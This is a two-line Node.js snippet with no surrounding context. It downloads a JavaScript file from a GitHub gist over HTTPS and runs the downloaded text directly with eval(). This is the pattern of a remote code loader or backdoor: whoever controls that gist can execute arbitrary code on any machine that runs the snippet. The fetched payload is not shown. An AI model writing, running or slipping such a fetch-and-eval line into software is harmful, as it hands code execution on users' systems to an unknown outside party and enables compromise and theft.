const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/faa768c53eba7350473dae9108b2a00f97cd6589/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
